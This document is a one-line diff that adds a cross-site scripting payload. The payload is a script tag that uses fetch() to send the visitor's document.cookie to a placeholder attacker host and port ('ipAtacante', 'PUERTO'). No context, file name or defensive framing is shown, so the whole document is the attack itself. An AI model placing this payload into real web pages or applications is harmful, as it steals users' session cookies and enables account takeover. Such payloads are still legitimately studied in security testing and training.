@@ -1,0 +1,1 @@
+<script>fetch('http://<ipAtacante>:PUERTO/?c='+document.cookie)</script>
